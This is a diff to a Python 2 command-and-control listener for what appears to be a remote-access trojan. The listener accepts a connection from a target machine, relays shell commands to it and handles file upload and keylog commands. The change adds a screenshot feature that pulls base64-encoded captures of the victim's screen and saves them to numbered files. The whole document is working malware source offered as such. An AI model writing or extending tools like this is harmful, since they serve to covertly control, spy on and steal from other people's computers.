@@ -20,6 +20,7 @@ def reliable_recv():
             continue
 
 def shell():
+    global count
     while True:
         command = raw_input("Shell#~%s: " % str(ip))
         reliable_send(command)
@@ -38,6 +39,17 @@ def shell():
             except:
                 failed = "Failed to uplaod file\n"
                 reliable_send(base64.b64encode(failed))
+
+        elif command[:10] == "screenshot":
+            with open("screenshot%d" % count, "wb") as sc:
+                image = reliable_recv()
+                image_decoded = base64.b64decode(image)
+                if image_decoded[:3] == "[-]":
+                    print(image_decoded)
+                else:
+                    sc.write(image_decoded)
+                    count += 1
+
         elif command[:11] == "keylog_start":
             continue
         else:
@@ -55,6 +67,7 @@ def server():
     print("[+] Listening for incoming connenctions")
     target, ip = s.accept()
 
+count = 1
 server()
 shell()
 s.close()
